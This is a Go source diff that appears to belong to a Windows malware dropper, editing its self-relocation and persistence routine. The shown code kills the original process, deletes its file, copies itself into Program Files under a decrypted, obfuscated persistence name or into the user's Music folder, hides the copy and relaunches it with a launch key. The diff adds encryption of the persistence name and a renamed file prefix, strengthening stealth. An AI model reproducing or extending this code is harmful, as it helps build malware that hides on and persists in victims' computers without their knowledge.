@@ -31,8 +31,6 @@ func main() {
 			path := args[2]
 			path = filepath.Clean(path)
 
-			utils.DebugLog(path)
-
 			info, err := os.Stat(path)
 			if err != nil {
 				return
@@ -42,7 +40,10 @@ func main() {
 				return
 			}
 
-			utils.RunCommand("taskkill", "/F", "/IM", filepath.Base(path))
+			err = utils.RunCommand("taskkill", "/F", "/IM", filepath.Base(path))
+			if err != nil {
+				utils.DebugLog(fmt.Sprintf("failed to kill launch exec - %s", err))
+			}
 
 			for i := range DELETE_OLD_FILE_MAX_RETRIES {
 				err = os.Remove(path)
@@ -50,7 +51,7 @@ func main() {
 					break
 				}
 
-				utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %v", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
+				utils.DebugLog(fmt.Sprintf("failed to delete old file (%d/%d) - %s", i+1, DELETE_OLD_FILE_MAX_RETRIES, err))
 				time.Sleep(500 * time.Millisecond)
 			}
 		}
@@ -71,8 +72,10 @@ func main() {
 	if store.USE_CUSTOM_NAME {
 		newName = store.CUSTOM_NAME
 	} else {
-		newName = filepath.Base(store.ExecPath)
+		newName = "_" + filepath.Base(store.ExecPath)
 	}
+
+	store.DecryptedPersistenceName = utils.Decrypt(store.PERSISTENCE_NAME)
 
 	if store.USE_CUSTOM_DIR {
 		newDir = store.CUSTOM_DIR
@@ -80,7 +83,7 @@ func main() {
 		if store.IsAdmin {
 			newDir = path.Join(
 				os.Getenv("PROGRAMFILES"),
-				store.PERSISTENCE_NAME,
+				store.DecryptedPersistenceName,
 			)
 		} else {
 			newDir = path.Join(store.HomePath, "Music")
@@ -94,7 +97,7 @@ func main() {
 	}
 
 	newExecPath := filepath.Join(newDir, newName)
-	utils.DebugLog(fmt.Sprintf("new path - %s", newExecPath))
+	utils.DebugLog(fmt.Sprintf("new path - %q", newExecPath))
 
 	err = utils.CopyFile(store.ExecPath, newExecPath)
 	if err != nil {
@@ -106,11 +109,6 @@ func main() {
 	utils.HideFile(newExecPath)
 
 	utils.RemoveMutex()
-	utils.RunCommand(
-		newExecPath,
-		store.LAUNCH_KEY,
-		store.ExecPath,
-	)
 
 	utils.DebugLog(fmt.Sprintf(
 		"relaunching - %q -> %q %s",
@@ -118,6 +116,12 @@ func main() {
 		newExecPath,
 		store.LAUNCH_KEY,
 	))
+
+	utils.RunCommand(
+		newExecPath,
+		store.LAUNCH_KEY,
+		store.ExecPath,
+	)
 
 	os.Exit(0)
 }
